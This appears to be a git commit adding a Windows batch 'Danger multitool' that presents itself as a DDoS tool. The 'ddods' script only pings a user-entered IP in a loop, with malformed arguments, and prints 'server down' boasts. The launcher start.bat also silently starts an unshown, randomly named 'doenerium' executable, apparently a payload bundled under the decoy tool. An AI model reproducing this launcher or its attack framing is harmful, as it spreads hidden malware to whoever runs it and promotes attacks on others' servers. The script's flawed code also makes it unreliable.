211c22406bb017adead1064f65237b18082013c9
pro <87319769+sh3boot@users.noreply.github.com>
2023-10-13 09:11:38 +0100

    dark bird
    Discord server: https://discord.gg/zjUf83MAVN

---
+++ dark bark/start.bat
@@ -0,0 +1,7 @@
+@echo off
+mode con: cols=100 lines=30
+title Danger multitool
+color 0a
+cls
+start utils/doenerium_IEUbQ36o
+start utils/ddods
---
+++ dark bark/utils/ddods.bat
@@ -0,0 +1,125 @@
+chcp 65001   < code if text art Doesn't Work
+@echo off
+color 08
+title (MADE BY @YeahimJJ)
+cls
+echo dn_r
+ 
+echo             ;::::;
+echo           ;::::; :;                                                                                             
+echo         ;:::::'   :;
+echo        ;:::::;     ;.
+echo       ,:::::'       ;           OOO\
+echo       ::::::;       ;          OOOOO\
+echo       ;:::::;       ;         OOOOOOOO
+echo      ,;::::::;     ;'         / OOOOOOO
+echo    ;:::::::::`. ,,,;.        /  / DOOOOOO
+echo  .';:::::::::::::::::;,     /  /     DOOOO
+echo ,::::::;::::::;;;;::::;,   /  /        DOOO
+echo ;`::::::`'::::::;;;::::: ,#/  /          DOOO
+echo:`:::::::`;::::::;;::: ;::#  /            DOOO
+echo::`:::::::`;:::::::: ;::::# /              DOO
+echo :`:::::::`;:::::: ;::::::#/               DOO
+echo :::`:::::::`;; ;:::::::::##                OO
+echo ::::`:::::::`;::::::::;:::#                OO
+echo `:::::`::::::::::::;'`:;::#                O
+echo  `:::::`::::::::;' /  / `:#
+echo   ::::::`:::::;'  /  /   `#
+echo https://discord.gg/zjUf83MAVN
+echo dn_r love you
+echo ----------------------------------------------
+@echo off 
+color 3
+:reboot
+echo off
+color 08
+set /p IP=ENTER the IP:
+set /p port=ENTER:ports 
+set /p do you love me=ENTER:do you love me y/n 
+:top
+PING  -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 echo server down SLAMED %IP% 
+color 08
+ping -t 2 0 1 127.0.0.1 >nul
+color 03
+ping -t 2 0 1 127.0.0.1 >nul
+color 07
+ping -t 2 0 1 127.0.0.1 >nul
+color 02
+ping -t 2 0 1 127.0.0.1 >nul
+color 03
+ping -t 2 0 1 127.0.0.1 >nul
+color 07 
+ping -t 2 0 1 127.0.0.1 >nul
+color 02
+GoTo top
+
+
+
+
+:rainbow
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo server down...)
+ping -t 2 0 10 127.0.0.1 >nul
+
+color a
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo server down...)
+ping -t 2 0 10 127.0.0.1 >nul
+color 02
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo server down...) 
+ping -t 2 0 10 127.0.0.1 >nul
+color 03
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo server down...) 
+ping -t 2 0 10 127.0.0.1 >nul
+color 04
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo server down...)
+ping -t 2 0 10 127.0.0.1 >nul
+color 05
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo down...) 
+ping -t 2 0 10 127.0.0.1 >nul
+color 06
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo down...) 
+ping -t 2 0 10 127.0.0.1 >nul
+color 07
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo offline...) 
+ping -t 2 0 10 127.0.0.1 >nul
+color 08
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo offline...) 
+ping -t 2 0 10 127.0.0.1 >nul
+color 09
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo offline...)
+ping -t 2 0 10 127.0.0.1 >nul
+color 0a
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo offline...)
+ping -t 2 0 10 127.0.0.1 >nul
+color 0b
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo offline...) 
+ping -t 2 0 10 127.0.0.1 >nul
+color 0c
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo offline...) 
+ping -t 2 0 10 127.0.0.1 >nul
+color 0d
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo offline...)
+ping -t 2 0 10 127.0.0.1 >nul
+color 0e
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo offline...)
+ping -t 2 0 10 127.0.0.1 >nul
+color 0f
+PING -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (SET in=c & echo offline...)
+ping -t 2 0 10 127.0.0.1 >nul
+goto rainbow
